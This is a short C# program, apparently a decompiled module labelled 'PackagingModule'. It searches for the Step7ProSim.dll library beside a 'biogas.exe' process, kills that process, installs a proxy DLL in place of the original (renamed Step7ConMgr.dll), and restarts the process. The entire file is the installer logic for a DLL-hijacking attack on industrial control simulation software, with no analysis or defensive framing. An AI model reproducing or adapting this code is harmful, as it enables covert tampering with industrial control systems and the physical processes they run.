
using System;
using System.IO;

namespace PackagingModule
{
  internal class Program
  {
    public static void Main(string[] args)
    {
      FileFinder fileFinder = new FileFinder();
      DllProxyInstaller dllProxyInstaller = new DllProxyInstaller();
      string str1 = "Step7ProSim.dll";
      string newDllFilename = "Step7ConMgr.dll";
      string str2 = "biogas.exe";
      Console.WriteLine("searching for components...");
      foreach (string fileName in fileFinder.FindFile(str1))
      {
        string directoryName = new FileInfo(fileName).DirectoryName;
        string str3 = Path.Combine(directoryName, str2);
        if (File.Exists(str3))
        {
          Console.WriteLine("Killing relevant processes...");
          ProcessManager.KillProcess(str2);
          dllProxyInstaller.InstallProxy(directoryName, str1, newDllFilename);
          Console.WriteLine("Restarting processes...");
          ProcessManager.StartProcess(str3, directoryName);
        }
      }
    }
  }
}
